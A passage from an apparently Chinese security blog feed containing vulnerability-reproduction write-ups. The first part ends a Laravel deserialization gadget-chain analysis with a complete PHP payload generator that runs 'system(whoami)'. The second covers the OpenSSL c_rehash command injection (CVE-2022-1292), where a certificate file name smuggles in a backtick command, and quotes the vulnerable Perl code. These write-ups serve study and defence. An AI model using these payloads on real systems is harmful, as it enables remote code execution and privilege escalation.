class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// Before returning, we will also set the resolved flag to "true" and pop off</span>        <span class="token comment">// the parameter overrides for this build. After those two things are done</span>        <span class="token comment">// we will be ready to return back the fully constructed class instance.</span>        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">resolved</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>        <span class="token function">array_pop</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">with</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$object</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后可见反会了一个类，我们要的就是通过这个类去调用 <code>__call</code> 方法</p><p>全局查找一下，这个执行命令的 <code>__call</code> 方法到底在哪个类：</p><p>最终找到的 <code>Illuminate\Container\Container</code></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/** * Call the given Closure / class@method and inject its dependencies. * * @param  callable|string  $callback * @param  array  $parameters * @param  string|null  $defaultMethod * @return mixed */</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">call</span><span class="token punctuation">(</span><span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token keyword type-hint">array</span> <span class="token variable">$parameters</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$defaultMethod</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token class-name static-context">BoundMethod</span><span class="token operator">::</span><span class="token function">call</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token punctuation">,</span> <span class="token variable">$callback</span><span class="token punctuation">,</span> <span class="token variable">$parameters</span><span class="token punctuation">,</span> <span class="token variable">$defaultMethod</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>构造 <code>$this-&gt;app</code> 的类 Application 也是该类的子类</p><pre><code>通过整体跟踪，猜测开发者的本意应该是实例化Illuminate\Contracts\Console\Kernel这个类，但是在getConcrete这个方法中出了问题，导致可以利用php的反射机制实例化任意类。问题出在vendor/laravel/framework/src/Illuminate/Container/Container.php的704行，可以看到这里判断$this-&gt;bindings[$abstract])是否存在，若存在则返回$this-&gt;bindings[$abstract][‘concrete’]。</code></pre><p>接下来就研究怎么返回该类</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$concrete</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getConcrete</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>跟进</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">/**    * Get the concrete type for a given abstract.    *    * @param  string  $abstract    * @return mixed   $concrete    */</span>   <span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">getConcrete</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_null</span><span class="token punctuation">(</span><span class="token variable">$concrete</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">getContextualConcrete</span><span class="token punctuation">(</span><span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">return</span> <span class="token variable">$concrete</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token comment">// If we don't have a registered resolver or concrete for the type, we'll just</span>       <span class="token comment">// assume each type is a concrete name and will attempt to resolve it as is</span>       <span class="token comment">// since the container should be able to resolve concretes automatically.</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">bindings</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">bindings</span><span class="token punctuation">[</span><span class="token variable">$abstract</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'concrete'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span>       <span class="token keyword">return</span> <span class="token variable">$abstract</span><span class="token punctuation">;</span>   <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>$this-&gt;bindings</code> 可控，于是可以获得任意值</p><p>接下来</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">isBuildable</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">,</span> <span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">build</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>     <span class="token variable">$object</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function-definition function">isBuildable</span><span class="token punctuation">(</span><span class="token variable">$concrete</span><span class="token punctuation">,</span> <span class="token variable">$abstract</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$concrete</span> <span class="token operator">===</span> <span class="token variable">$abstract</span> <span class="token operator">||</span> <span class="token variable">$concrete</span> <span class="token keyword">instanceof</span> <span class="token class-name">Closure</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>这里的 $concrete 是我们可控的，而 $abstract 是 Illuminate\Contracts\Console\Kernel。经过打断点测试，<code>$this-&gt;build($concrete)</code> 得到的结果基本就是最终这个get the value of offset返回的了，因此要想办法让 <code>$concrete</code> 是 <code>Illuminate\Foundation\Application</code>，既然 <code>$concrete</code> 可控，</p><p>构造 payload</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth<span class="token punctuation">\</span>GenericUser</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Application</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">PendingCommand</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$hasExecuted</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$command</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$parameters</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$app</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">hasExecuted</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">command</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'system'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">parameters</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'whoami'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">test</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">GenericUser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Application</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Auth</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">GenericUser</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$attributes</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expectedQuestions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">attributes</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'expectedOutput'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation</span> <span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Application</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$bindings</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">bindings</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                <span class="token string single-quoted-string">'Illuminate\Contracts\Console\Kernel'</span> <span class="token operator">=&gt;</span> <span class="token keyword">array</span><span class="token punctuation">(</span>                    <span class="token string single-quoted-string">'concrete'</span> <span class="token operator">=&gt;</span> <span class="token string single-quoted-string">'Illuminate\Foundation\Application'</span>                <span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Testing<span class="token punctuation">\</span>PendingCommand</span><span class="token punctuation">;</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PendingCommand</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/rfrder/article/details/113826483">https://blog.csdn.net/rfrder/article/details/113826483</a></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Laravel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenSSL c_rehash 命令注入漏洞</title>
      <link href="/2023/01/28/penetrationstest/lou-dong-fu-xian/openssl/openssl-c-rehash-ming-ling-zhu-ru-lou-dong/"/>
      <url>/2023/01/28/penetrationstest/lou-dong-fu-xian/openssl/openssl-c-rehash-ming-ling-zhu-ru-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="OpenSSL-c-rehash-命令注入漏洞"><a href="#OpenSSL-c-rehash-命令注入漏洞" class="headerlink" title="OpenSSL c_rehash 命令注入漏洞"></a>OpenSSL c_rehash 命令注入漏洞</h1><p>#CVE-2022-1292 #OpenSSL #c_rehash </p><h2 id="工具介绍"><a href="#工具介绍" class="headerlink" title="工具介绍"></a>工具介绍</h2><p>c_rehash 为文件创建一个符号连接，并将此符号连接的名称设为文件的hash值，作用是让openssl在证书目录中能够找到证书。</p><p><a href="https://blog.csdn.net/yeweiliweiwei/article/details/49701449">c_rehash_夜微的博客-CSDN博客_c_rehash</a></p><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>在 <code>openssl</code> 中的 <code>c_rehash</code> 存在命令注入, 允许以 <code>c_reash</code> 脚本的权限执行命令</p><p>在某些系统下,&nbsp;<code>c_rehash</code> 会被自动运行, 可能可以用于提权,&nbsp;<a href="https://cve.report/CVE-2022-1292">漏洞详情</a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"-----BEGIN CERTIFICATE-----"</span> <span class="token operator">&gt;</span> <span class="token string">"crt/test.crt\<span class="token variable"><span class="token variable">`</span>id<span class="token punctuation">\</span><span class="token variable">`</span></span>"</span><span class="token function">ls</span> crt/./c_rehash crt/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/../../../../pic/Pasted%20image%2020230227162930.png"></p><p>成功实现了命令执行</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>这里截取下部分关键代码</p><pre class="line-numbers language-perl" data-language="perl"><code class="language-perl"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">@ARGV</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">@dirlist</span> <span class="token operator">=</span> <span class="token variable">@ARGV</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$ENV</span><span class="token punctuation">{</span>SSL_CERT_DIR<span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">@dirlist</span> <span class="token operator">=</span> split <span class="token regex">/$path_delim/</span><span class="token punctuation">,</span> <span class="token variable">$ENV</span><span class="token punctuation">{</span>SSL_CERT_DIR<span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$dirlist</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"$dir/certs"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">@dirlist</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-d</span> <span class="token variable">$_</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">-w</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>hash_dir<span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                <span class="token keyword">print</span> <span class="token string">"Skipping $_, can't write\n"</span><span class="token punctuation">;</span>                <span class="token variable">$errorcount</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">sub</span> <span class="token function">hash_dir</span> <span class="token punctuation">{</span><span class="token keyword">my</span> <span class="token variable">%hashlist</span><span class="token punctuation">;</span><span class="token keyword">print</span> <span class="token string">"Doing $_[0]\n"</span><span class="token punctuation">;</span>chdir <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>opendir<span class="token punctuation">(</span>DIR<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">@flist</span> <span class="token operator">=</span> sort readdir<span class="token punctuation">(</span>DIR<span class="token punctuation">)</span><span class="token punctuation">;</span>closedir DIR<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token variable">$removelinks</span> <span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment"># Delete any existing symbolic links</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span>grep <span class="token punctuation">{</span><span class="token regex">/^[\da-f]+\.r{0,1}\d+$/</span><span class="token punctuation">}</span> <span class="token variable">@flist</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-l</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">print</span> <span class="token string">"unlink $_"</span> <span class="token keyword">if</span> <span class="token variable">$verbose</span><span class="token punctuation">;</span>unlink <span class="token variable">$_</span> <span class="token operator">||</span> warn <span class="token string">"Can't unlink $_, $!\n"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>FILE<span class="token punctuation">:</span> <span class="token keyword">foreach</span> <span class="token variable">$fname</span> <span class="token punctuation">(</span>grep <span class="token punctuation">{</span><span class="token regex">/\.(pem)|(crt)|(cer)|(crl)$/</span><span class="token punctuation">}</span> <span class="token variable">@flist</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment"># Check to see if certificates and/or CRLs present.</span><span class="token keyword">my</span> <span class="token punctuation">(</span><span class="token variable">$cert</span><span class="token punctuation">,</span> <span class="token variable">$crl</span><span class="token punctuation">)</span> <span class="token operator">=</span> check_file<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$cert</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token variable">$crl</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">print</span> STDERR <span class="token string">"WARNING: $fname does not contain a certificate or CRL: skipping\n"</span><span class="token punctuation">;</span><span class="token keyword">next</span><span class="token punctuation">;</span><span class="token punctuation">}</span>link_hash_cert<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>link_hash_cert_old<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cert</span><span class="token punctuation">)</span><span class="token punctuation">;</span>link_hash_crl<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$crl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>link_hash_crl_old<span class="token punctuation">(</span><span class="token variable">$fname</span><span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$crl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">sub</span> <span class="token function">check_file</span> <span class="token punctuation">{</span><span class="token keyword">my</span> <span class="token punctuation">(</span><span class="token variable">$is_cert</span><span class="token punctuation">,</span> <span class="token variable">$is_crl</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$fname</span> <span class="token operator">=</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>open IN<span class="token punctuation">,</span> <span class="token variable">$fname</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token filehandle symbol">&lt;IN&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token regex">/^-----BEGIN (.*)-----/</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">my</span> <span class="token variable">$hdr</span> <span class="token operator">=</span> <span class="token variable">$1</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hdr</span> <span class="token operator">=~</span> <span class="token regex">/^(X509 |TRUSTED |)CERTIFICATE$/</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$is_cert</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">last</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$is_crl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">elsif</span> <span class="token punctuation">(</span><span class="token variable">$hdr</span> <span class="token operator">eq</span> <span class="token string">"X509 CRL"</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$is_crl</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">last</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$is_cert</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span>close IN<span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$is_cert</span><span class="token punctuation">,</span> <span class="token variable">$is_crl</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">sub</span> <span class="token function">link_hash_cert</span> <span class="token punctuation">{</span><span class="token keyword">my</span> <span class="token variable">$fname</span> <span class="token operator">=</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$x509hash</span> <span class="token operator">=</span> <span class="token variable">$_</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token string">'-subject_hash'</span><span class="token punctuation">;</span><span class="token variable">$fname</span> <span class="token operator">=~</span> <span class="token regex">s/'/'\\''/g</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token punctuation">(</span><span class="token variable">$hash</span><span class="token punctuation">,</span> <span class="token variable">$fprint</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token string">`"$openssl" x509 $x509hash -fingerprint -noout -in "$fname"`</span><span class="token punctuation">;</span>chomp <span class="token variable">$hash</span><span class="token punctuation">;</span>chomp <span class="token variable">$fprint</span><span class="token punctuation">;</span><span class="token variable">$fprint</span> <span class="token operator">=~</span> <span class="token regex">s/^.*=//</span><span class="token punctuation">;</span><span class="token variable">$fprint</span> <span class="token operator">=~</span> <span class="token regex">tr/://d</span><span class="token punctuation">;</span><span class="token keyword">my</span> <span class="token variable">$suffix</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment"># Search for an unused hash filename</span><span class="token keyword">while</span><span class="token punctuation">(</span>exists <span class="token variable">$hashlist</span><span class="token punctuation">{</span><span class="token string">"$hash.$suffix"</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment"># Hash matches: if fingerprint matches its a duplicate cert</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hashlist</span><span class="token punctuation">{</span><span class="token string">"$hash.$suffix"</span><span class="token punctuation">}</span> <span class="token operator">eq</span> <span class="token variable">$fprint</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">print</span> STDERR <span class="token string">"WARNING: Skipping duplicate certificate $fname\n"</span><span class="token punctuation">;</span><span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$suffix</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$hash</span> <span class="token operator">.=</span> <span class="token string">".$suffix"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$symlink_exists</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">print</span> <span class="token string">"link $fname -&gt; $hash\n"</span> <span class="token keyword">if</span> <span class="token variable">$verbose</span><span class="token punctuation">;</span>symlink <span class="token variable">$fname</span><span class="token punctuation">,</span> <span class="token variable">$hash</span> <span class="token operator">||</span> warn <span class="token string">"Can't symlink, $!"</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token keyword">print</span> <span class="token string">"copy $fname -&gt; $hash\n"</span> <span class="token keyword">if</span> <span class="token variable">$verbose</span><span class="token punctuation">;</span>                        <span class="token keyword">if</span> <span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token variable">$in</span><span class="token punctuation">,</span> <span class="token string">"&lt;"</span><span class="token punctuation">,</span> <span class="token variable">$fname</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                            <span class="token keyword">if</span> <span class="token punctuation">(</span>open<span class="token punctuation">(</span><span class="token variable">$out</span><span class="token punctuation">,</span><span class="token string">"&gt;"</span><span class="token punctuation">,</span> <span class="token variable">$hash</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                                <span class="token keyword">print</span> <span class="token variable">$out</span> <span class="token variable">$_</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$in</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                close <span class="token variable">$out</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                                warn <span class="token string">"can't open $hash for write, $!"</span><span class="token punctuation">;</span>                            <span class="token punctuation">}</span>                            close <span class="token variable">$in</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>                            warn <span class="token string">"can't open $fname for read, $!"</span><span class="token punctuation">;</span>                        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hashlist</span><span class="token punctuation">{</span><span class="token variable">$hash</span><span class="token punctuation">}</span> <span class="token operator">=</span> <span class="token variable">$fprint</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" 